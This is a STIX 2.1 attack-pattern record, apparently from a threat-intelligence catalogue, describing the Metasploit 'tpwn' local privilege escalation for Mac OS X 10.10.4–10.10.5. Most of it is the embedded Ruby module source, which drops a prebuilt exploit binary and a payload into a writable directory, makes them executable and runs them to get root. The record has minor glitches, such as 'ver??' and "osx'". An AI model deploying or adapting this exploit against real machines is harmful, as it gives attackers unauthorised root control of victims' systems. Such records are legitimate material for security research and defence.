{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4e6cad98-68f6-4371-98de-f6779c0b7315",
    "created": "2024-08-14T16:34:45.752785Z",
    "modified": "2024-08-14T16:34:45.752789Z",
    "name": "Mac OS X \"tpwn\" Privilege Escalation",
    "description": " This module exploits a null pointer dereference in XNU to escalate privileges to root.  Tested on 10.10.4 and 10.10.5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/tpwn.rb",
            "external_id": "tpwn.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/kpwn/tpwn"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mac OS X \"tpwn\" Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a null pointer dereference in XNU to escalate\n        privileges to root.\n\n        Tested on 10.10.4 and 10.10.5.\n      },\n      'Author'         => [\n        'qwertyoruiop', # Vulnerability discovery and PoC\n        'wvu'           # Copy/paste monkey\n      ],\n      'References'     => [\n        ['URL', 'https://github.com/kpwn/tpwn']\n      ],\n      'DisclosureDate' => '2015-08-16',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'osx',\n      'Arch'           => ARCH_X64,\n      'SessionTypes'   => ['shell'],\n      'Privileged'     => true,\n      'Targets'        => [\n        ['Mac OS X 10.10.4-10.10.5', {}]\n      ],\n      'DefaultTarget'  => 0\n    ))\n\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    ver?? CheckCode::Appears : CheckCode::Safe\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    if check != CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    print_status(\"Writing exploit to `#{exploit_file}'\")\n    write_file(exploit_file, binary_exploit)\n    register_file_for_cleanup(exploit_file)\n\n    print_status(\"Writing payload to `#{payload_file}'\")\n    write_file(payload_file, binary_payload)\n    register_file_for_cleanup(payload_file)\n\n    print_status('Executing exploit...')\n    cmd_exec(sploit)\n    print_status('Executing payload...')\n    cmd_exec(payload_file)\n  end\n\n  def ver?\n    Rex::Version.new(get_sysinfo['ProductVersion']).between?(\n      Rex::Version.new('10.10.4'), Rex::Version.new('10.10.5')\n    )\n  end\n\n  def sploit\n    \"chmod +x #{exploit_file} #{payload_file} && #{exploit_file}\"\n  end\n\n  def binary_exploit\n    File.read(File.join(\n      Msf::Config.data_directory, 'exploits', 'tpwn', 'tpwn'\n    ))\n  end\n\n  def binary_payload\n    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n  end\n\n  def exploit_file\n    @exploit_file ||=\n      \"#{base_dir}/#{Rex::Text.rand_text_alpha(8)}\"\n  end\n\n  def payload_file\n    @payload_file ||=\n      \"#{base_dir}/#{Rex::Text.rand_text_alpha(8)}\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-16",
    "x_mitre_platforms": [
        "osx'"
    ]
}